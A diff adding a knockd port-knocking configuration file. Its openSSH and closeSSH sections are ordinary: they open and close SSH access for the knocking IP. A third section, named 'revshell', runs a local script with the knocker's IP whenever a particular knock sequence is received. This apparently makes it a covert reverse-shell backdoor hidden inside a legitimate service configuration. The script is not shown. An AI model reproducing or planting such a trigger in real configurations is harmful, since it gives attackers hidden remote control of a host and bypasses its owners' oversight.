@@ -1,0 +1,20 @@
+[options]
+    logfile = /var/log/knockd.log
+
+[openSSH]
+    sequence    = 8001,10001,12001
+    seq_timeout = 5
+    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+    tcpflags    = syn
+
+[closeSSH]
+    sequence    = 8000,10000,12000
+    seq_timeout = 5
+    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+    tcpflags    = syn
+
+[revshell]
+    sequence    = 8500,15000,25000
+    seq_timeout = 5
+    command     = exec /usr/local/bin/revshel.sh %IP%
+    tcpflags    = syn
